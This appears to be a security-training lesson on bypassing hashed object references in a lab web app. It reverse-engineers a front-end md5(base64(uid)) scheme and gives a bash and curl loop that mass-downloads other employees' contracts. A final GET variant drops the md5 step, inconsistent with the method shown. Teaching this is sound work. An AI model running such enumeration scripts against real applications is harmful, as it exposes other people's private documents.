# Bypassing Encoded References
In some cases, web applications make hashes or encode their object references, making enumeration more difficult, but it may still be possible.
## Example Scenario
Let's go back to the `Employee Manager` web application to test the `Contracts` functionality.

If we click on the `Employment_contract.pdf` file, it starts downloading the file. The intercepted request in Burp looks as follows:

![HTTP POST request to /download.php with contract parameter 'cdd96d3cc73d1dbdaffa03c6cd7339b' and headers including Host, Content-Length, and User-Agent](https://academy.hackthebox.com/storage/modules/134/web_attacks_idor_download_contract.jpg)

We see that it is sending a `POST` request to `download.php` with the following data:
```php
contract=cdd96d3cc73d1dbdaffa03cc6cd7339b
```
- In this case, the web application is not sending the direct reference in cleartext but appears to be hashing it in an `md5` format.

We can attempt to hash various values, like `uid`, `username`, `filename`, and many others, and see if any of their `md5` hashes match the above value. If we find a match, then we can replicate it for other users and collect their files. For example, let's try to compare the `md5` hash of our `uid`, and see if it matches the above hash:
```bash
echo -n 1 | md5sum

c4ca4238a0b923820dcc509a6f75849b
```

Unfortunately, the hashes do not match. We can attempt this with various other fields, but none of them matches our hash.
## Function Disclosure
As most modern web applications are developed using JavaScript frameworks, like `Angular`, `React`, or `Vue.js`, many web developers may make the mistake of performing sensitive functions on the front-end, which would expose them to attackers.

For example, if the above hash was being calculated on the front-end, we can study the function and then replicate what it's doing to calculate the same hash. Luckily for us, this is precisely the case in this web application.

If we take a look at the link in the source code, we see that it is calling a JavaScript function with `javascript:downloadContract('1')`. Looking at the `downloadContract()` function in the source code, we see the following:
```javascript
function downloadContract(uid) {
    $.redirect("/download.php", {
        contract: CryptoJS.MD5(btoa(uid)).toString(),
    }, "POST", "_self");
}
```

This function appears to be sending a `POST` request with the `contract` parameter, which is what we saw above. The value it is sending is an `md5` hash using the `CryptoJS` library, which also matches the request we saw earlier. So, the only thing left to see is what value is being hashed.

In this case, the value being hashed is `btoa(uid)`, which is the `base64` encoded string of the `uid` variable, which is an input argument for the function. Going back to the earlier link where the function was called, we see it calling `downloadContract('1')`. So, the final value being used in the `POST` request is the `base64` encoded string of `1`, which was then `md5` hashed.

We can test this by `base64` encoding our `uid=1`, and then hashing it with `md5`, as follows:
```bash
echo -n 1 | base64 -w 0 | md5sum

cdd96d3cc73d1dbdaffa03cc6cd7339b -
```
- `-n` flag with `echo`, and the `-w 0` flag with `base64`, to avoid adding newlines, in order to be able to calculate the `md5` hash of the same value, without hashing newlines, as that would change the final `md5` hash.

We have successfully reversed the hashing technique used on the object references, turning them into IDOR's. With that, we can begin enumerating other employees' contracts using the same hashing method we used above. `Before continuing, try to write a script similar to what we used in the previous section to enumerate all contracts`.
## Mass Enumeration
Let us write a simple bash script to retrieve all employee contracts. More often than not, this is the easiest and most efficient method of enumerating data and files through IDOR vulnerabilities

We can start by calculating the hash for each of the first ten employees using the same previous command while using `tr -d` to remove the trailing `-` characters, as follows:
```bash
for i in {1..10}; do echo -n $i | base64 -w 0 | md5sum | tr -d ' -'; done
```

Next, we can make a `POST` request on `download.php` with each of the above hashes as the `contract` value, which should give us our final script:
```bash
#!/bin/bash

for i in {1..10}; do
    for hash in $(echo -n $i | base64 -w 0 | md5sum | tr -d ' -'); do
        curl -sOJ -X POST -d "contract=$hash" http://SERVER_IP:PORT/download.php
    done
done
```

We can run with `bash ./exploit.sh` and get all contracts for employees 1-10.
### GET request instead of POST request
```bash
for i in {1..20}; do
    for hash in $(echo -n $i | base64 -w 0); do
        curl -sOJ "http://STMIP:STMPO/download.php?contract=$hash"
    done
done
```
